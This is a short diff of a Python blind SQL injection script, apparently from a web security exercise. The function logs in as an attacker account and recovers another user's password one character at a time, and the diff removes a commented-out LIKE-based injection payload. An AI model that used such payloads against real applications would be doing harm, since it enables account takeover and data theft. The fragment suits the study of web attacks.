@@ -37,11 +37,6 @@ def sqli_attack(username):
     # Verify attacker logged in successfully
     assert(submit_login_form(sess, "attacker", "attacker"))
    
-    # Can learn about password with wildcards and trying different characters
-    s_test = "{}' AND users.password LIKE 'websecurityisfun%".format(username)
-    # response = submit_pay_form(sess, s_test, 0)
-    # print(response)
-
     password = []
     while True:
         c = test_char(sess, username, "".join(password))
